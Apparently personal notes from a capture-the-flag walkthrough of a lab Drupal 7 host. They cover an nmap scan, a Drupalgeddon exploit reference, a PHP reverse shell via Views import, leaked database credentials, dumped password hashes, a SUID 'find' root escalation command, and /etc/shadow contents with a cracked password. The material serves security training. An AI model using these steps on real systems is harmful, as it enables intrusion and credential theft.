## Main exploits

- CVE-2014-3704 https://www.exploit-db.com/exploits/34993
- PHP reverse shell via Structure -> Views -> Import -> Paste code
- Suid bit on /bin/find

## Port enum
```
❯ sudo nmap -sV -sC -O -T4 -n -Pn -oA fastscan 192.168.0.119
[sudo] password for volt: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-17 15:33 CEST
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 33.33% done; ETC: 15:34 (0:00:12 remaining)
Nmap scan report for 192.168.0.119
Host is up (0.00071s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 c4d659e6774c227a961660678b42488f (DSA)
|   2048 1182fe534edc5b327f446482757dd0a0 (RSA)
|_  256 3daa985c87afea84b823688db9055fd8 (ECDSA)
80/tcp  open  http    Apache httpd 2.2.22 ((Debian))
|_http-title: Drupal Site
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.2.22 (Debian)
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          34457/udp   status
|   100024  1          37812/tcp6  status
|   100024  1          48303/tcp   status
|_  100024  1          55158/udp6  status
MAC Address: 08:00:27:F9:A8:A8 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.2 - 3.16
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

/robots.txt and /.gitignore can be useful source of information, like for example /xmlrpc.php which can be a major weakness

Contents of /var/www/sites/default/settings.php:
```
database = drupaldb
username = dbuser
password = R0ck3t
driver = mysql
```

Entering mysql -u (user) -p (database)
```
FROM users
SELECT name, pass;

admin	$S$Dx4z79qDXKpaQSl2aYLrym9PJMDpGhM5XdoS105YvAjimmLprDY0 - admin
Fred	$S$DOoqDF0EUxe6rsF8aITPZctZ6KsVKtOcw3e1sjuEAmbo25Ofdxm9 - fred
volt	$S$DWyjtA4pwMorh00PT5uX9KiVo299ENGVYUaVpOMMkexKlszU5A5v
user	$S$DvagVTOxcHgKK.90HX/VxZhjF05KH1ffPCAajMjC4pnQ39ZeYvUm
asdf	$S$Df9LAWEgFObyWr1.KLxvfNQCy/b1FFDQyYpstS0iQJ0uU4xdFfNI
```

SUID search:
```
find . -perm /4000
```

find has suid, escalation:
```
touch raj
find raj -exec "/bin/sh" \;
```

After getting root /etc/shadow:
```
root:$6$rhe3rFqk$NwHzwJ4H7abOFOM67.Avwl3j8c05rDVPqTIvWg8k3yWe99pivz/96.K7IqPlbBCmzpokVmn13ZhVyQGrQ4phd/
flag4:$6$Nk47pS8q$vTXHYXBFqOoZERNGFThbnZfi5LN0ucGZe05VMtMuIFyqYzY/eVbPNMZ7lpfRVc0BYrQ0brAhJoEzoEWCKxVW80
```

Output from JtR for flag4:orange